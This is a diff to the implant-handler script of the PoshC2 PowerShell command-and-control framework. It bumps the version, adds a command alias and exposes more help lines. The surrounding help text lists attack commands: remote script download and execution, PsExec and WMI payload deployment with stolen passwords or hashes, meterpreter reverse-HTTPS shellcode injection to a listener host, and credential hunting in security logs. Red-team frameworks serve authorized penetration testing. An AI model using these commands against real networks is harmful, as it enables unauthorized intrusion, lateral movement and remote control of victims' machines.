@@ -59,7 +59,7 @@ function Implant-Handler
             Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
             Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
             Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
-            Write-Host "============== v2.2 www.PoshC2.co.uk ==============" -ForegroundColor Green
+            Write-Host "============== v2.3 www.PoshC2.co.uk ==============" -ForegroundColor Green
             Write-Host "===================================================" `n -ForegroundColor Green
 
             foreach ($implant in $dbresults) 
@@ -135,7 +135,7 @@ function Implant-Handler
         write-host " LoadModule <modulename>" -ForegroundColor Green 
         write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
         write-host " Invoke-Expression (Get-Webclient).DownloadString(`"https://module.ps1`")" -ForegroundColor Green
-        write-host " StartAnotherImplant" -ForegroundColor Green 
+        write-host " StartAnotherImplant or SAI" -ForegroundColor Green 
         write-host " StartAnotherImplantWithProxy" -ForegroundColor Green 
         write-host " Invoke-DaisyChain -port 4444 -daisyserver 192.168.1.1" -ForegroundColor Green
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
@@ -212,7 +212,7 @@ function Implant-Handler
         write-host " Invoke-PsExecPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
         write-host " Invoke-PsExecProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
         write-host " Invoke-WMIProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
-        #write-host " Invoke-WMIDaisyPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>'" -ForegroundColor Green
+        write-host " Invoke-WMIDaisyPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>'" -ForegroundColor Green
         #write-host " EnableWinRM | DisableWinRM -computer <dns/ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
         write-host " Invoke-WinRMSession -IPAddress <ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
         write-host `n "Credentials / Tokens / Local Hashes (Must be SYSTEM): " -ForegroundColor Green
@@ -250,6 +250,7 @@ function Implant-Handler
         write-host " Invoke-PSInject-ProxyPayload (migrates to netsh.exe automatically if not procid is passed)" -ForegroundColor Green
         write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
         write-host ' Get-Eventlog -newest 10000 -instanceid 4624 -logname security | select message -ExpandProperty message | select-string -pattern "user1|user2|user3"' -ForegroundColor Green
+        write-host ' Send-MailMessage -to "itdept@test.com" -from "User01 <user01@example.com>" -subject <> -smtpServer <> -Attachment <>'-ForegroundColor Green
         write-host `n "Implant Handler: " -ForegroundColor Green
         write-host "=====================" -ForegroundColor Red
         write-host " Back" -ForegroundColor Green 
